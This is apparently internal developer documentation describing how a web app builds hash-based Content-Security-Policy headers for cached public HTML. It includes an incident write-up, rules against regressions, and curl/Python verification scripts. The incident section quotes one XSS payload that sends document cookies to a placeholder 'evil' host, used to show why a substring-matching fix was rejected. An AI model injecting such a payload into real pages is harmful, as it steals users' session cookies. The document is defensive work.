# Public HTML Content-Security-Policy

This document describes how JED sets `Content-Security-Policy` on **anonymous, edge-cacheable HTML** (marketing, blog, docs, CMS pages, and similar). Private and session routes use a separate nonce-based CSP from `#/lib/security-headers.server` and are not covered here.

## How it works

### Per-request nonce

1. **`bindSsrNonceMiddleware`** (first entry in `src/start.ts` `requestMiddleware`) calls `generateNonce()` and stores it on the current `Request` via `#/lib/ssr-nonce.server` (`bindRequestSsrNonce`). The same value is passed into Start request context as `{ nonce }`.
2. **`getRouter()`** in `src/router.tsx` calls **`requireRequestSsrNonce()`** and sets `router.options.ssr.nonce` before TanStack creates hydration scripts (`data-tsr-stream-part` and related inline scripts).
3. Signed-in and credentialed requests skip the public HTML CSP path; they receive `private, no-store` HTML from the origin.

### Shipped-HTML hashing (production)

For anonymous public HTML, `#/lib/apply-public-html-csp.server` (`applyPublicHtmlContentSecurityPolicy`):

1. Reads the full SSR HTML **before** stripping nonces.
2. Asserts every `data-tsr-stream-part` inline script carries the **matching** request SSR nonce (`assertTsrStreamPartScriptsHaveSsrNonce`).
3. Strips `nonce="…"` attributes and the `csp-nonce` meta tag from the bytes sent to the browser.
4. Builds `script-src` from **shipped** inline scripts only (`collectPublicHtmlInlineScriptSrcHashes`), trusting scripts that had the request nonce on the pre-strip tag.
5. Sets `Content-Security-Policy` with `'self'` plus one `'sha256-…'` entry per shipped inline script body. **`script-src` does not use `'unsafe-inline'` or `'nonce-…'`** on these responses (hashes only).
6. **`assertSentHtmlInlineScriptsMatchCsp`** fails closed if any shipped inline script lacks a hash in CSP, or if CSP lists a hash that does not match any shipped inline script (**orphan-hash rejection**).

Development uses `Content-Security-Policy-Report-Only` so Vite HMR can run.

### Edge cache tag `html-csp-v2`

Public HTML that is edge-cacheable includes `Cache-Tag` / `Vercel-Cache-Tag` with `html-csp-v2` (alongside `content`, `content:list`, and blog tags where applicable). Bump or extend this tag when CSP policy or hashing rules change so stale HTML and CSP pairs can be purged after deploy.

Relevant code: `publicEdgeCacheTags` in `src/start.ts`, `#/lib/seo/request-policy.server`, `vercel.json` credentialed cache transforms.

## Incident: PR #50 and PR #51 (2026)

### Symptoms

On production (`jed.vercel.app`), public pages shipped `<script data-tsr-stream-part="">` bootstrap tags **without** a `nonce` attribute. Those bodies were **not** listed in `script-src` `sha256-…` sources. Browsers blocked hydration. In some cases CSP listed hashes that did not match any script in the document (orphan hashes), often on CDN cache hits.

### Root cause

`getRouter()` previously set `ssr: { nonce: getNonce() }` where `getNonce()` read **`getGlobalStartContext()`**. On Vercel, TanStack Start can call **`getRouter()` before** `contextAfterGlobalMiddlewares` is available (for example during redirect resolution in `handleRedirectResponse`). In that window `getNonce()` returned **`undefined`**, so `createHydrationScripts()` in `@tanstack/router-core` emitted stream transport scripts **without** a nonce. The CSP middleware only hashed inline scripts that carried the request SSR nonce, so stream bootstrap was omitted from `script-src` while still present in the HTML.

PR #51 fixed this by binding the nonce on the **`Request`** in the first middleware and using **`requireRequestSsrNonce()`** in `getRouter()`. A rejected approach hashed nonce-less stream scripts when the body merely contained `self.$_TSR` (substring match). That would have allowed XSS such as `self.$_TSR;fetch('//evil?'+document.cookie)` and was **not** merged.

### Tests added with the fix

- `src/lib/public-route-html-csp.integration.test.ts`: after `npm run build`, loads `.vercel/output/functions/__server.func/index.mjs`, fetches `/` **twice**, asserts every `data-tsr-stream-part` has the request nonce pre-strip, and that nonces differ between runs.
- Unit tests in `src/lib/public-inline-script-hashes.test.ts` for wrong nonces and injected stream markup.

## Rules (do not regress)

| Rule | Detail |
|------|--------|
| Bind nonce first | `bindSsrNonceMiddleware` must remain the **first** request middleware. Every code path that can call `getRouter()` on the server must run after the nonce is bound on the `Request`. |
| `getRouter()` | Must call **`requireRequestSsrNonce()`** (or equivalent read of the bound request nonce). Do not read SSR nonce only from `getGlobalStartContext()` for hydration. |
| Trust model | Hash **only** inline scripts that had the **matching** request SSR nonce before strip. **Never** trust nonce-less `data-tsr-stream-part` tags, **never** trust body shape or substring matches (`self.$_TSR`, seroval markers, and similar). |
| No `unsafe-inline` | Do not add `'unsafe-inline'` to `script-src` on public HTML responses. |
| Orphan hashes | CSP `script-src` must list exactly the hashes of shipped inline scripts (enforced in `assertSentHtmlInlineScriptsMatchCsp`). |
| Changes | Any change to CSP building, nonce binding, stream hashing, or public HTML cache tags requires: **`npm run build`**, passing **`public-route-html-csp.integration.test.ts`** (built handler double fetch), unit tests in **`public-inline-script-hashes.test.ts`**, and **Shield** review on the PR. Update this doc and `AGENTS.md` in the same PR when behavior changes. |

Key modules: `#/lib/ssr-nonce.server`, `#/lib/public-inline-script-hashes.server`, `#/lib/apply-public-html-csp.server`, `src/start.ts`, `src/router.tsx`.

## Verify on production after deploy

Use a **cache-busting** request so you inspect a fresh origin response (not a stale CDN object):

```bash
ORIGIN="https://jed.vercel.app"
BUST="__csp_verify=$(date +%s)"
curl -sSI "${ORIGIN}/?${BUST}" -H 'Accept: text/html' | rg -i '^(HTTP|x-vercel-cache|content-security-policy|cache-tag):'
```

Fetch the body and confirm every inline script hash appears in CSP:

```bash
export ORIGIN="https://jed.vercel.app"
export BUST="__csp_verify=$(date +%s)"
python3 << 'PY'
import os, re, hashlib, base64, urllib.request

url = f"{os.environ['ORIGIN']}/?{os.environ['BUST']}"
req = urllib.request.urlopen(url)
csp = req.headers.get("Content-Security-Policy", "")
html = req.read().decode("utf-8", errors="replace")
cache = req.headers.get("x-vercel-cache", "")

def sha(body: str) -> str:
    b = body.replace("\0", "\ufffd").encode()
    return "'sha256-" + base64.b64encode(hashlib.sha256(b).digest()).decode() + "'"

csp_hashes = set(re.findall(r"'sha256-[^']+'", csp))
inline_hashes = []
for m in re.finditer(r"<script\b[^>]*>", html, re.I):
    ot = m.group(0)
    if re.search(r"\ssrc\s*=", ot, re.I):
        continue
    start = m.end()
    close = html.lower().find("</script>", start)
    body = html[start:close]
    if body:
        inline_hashes.append(sha(body))

missing = [h for h in inline_hashes if h not in csp_hashes]
orphan = [h for h in csp_hashes if h not in inline_hashes]
print("x-vercel-cache:", cache)
print("inline_scripts:", len(inline_hashes), "csp_sha256:", len(csp_hashes))
print("missing_from_csp:", missing)
print("orphan_in_csp:", orphan)
if missing or orphan:
    raise SystemExit(1)
print("ok")
PY
```

Repeat for `/blog`, a post URL, and `/features` if you changed shared layout or scripts.

Pre-strip checks (local or staging): built-handler integration test capture hook `globalThis.__amnPreStripPublicHtmlHook` must show `nonce="…"` on every `data-tsr-stream-part` open tag matching `capture.ssrNonce`.

## Related reading

- `AGENTS.md` (Security, Caching)
- `content/starter-docs/docs/caching.md` (public HTML at the edge)
- `#/lib/security-headers.server` (nonce CSP for non-public HTML, plus `Cross-Origin-Opener-Policy: same-origin`)
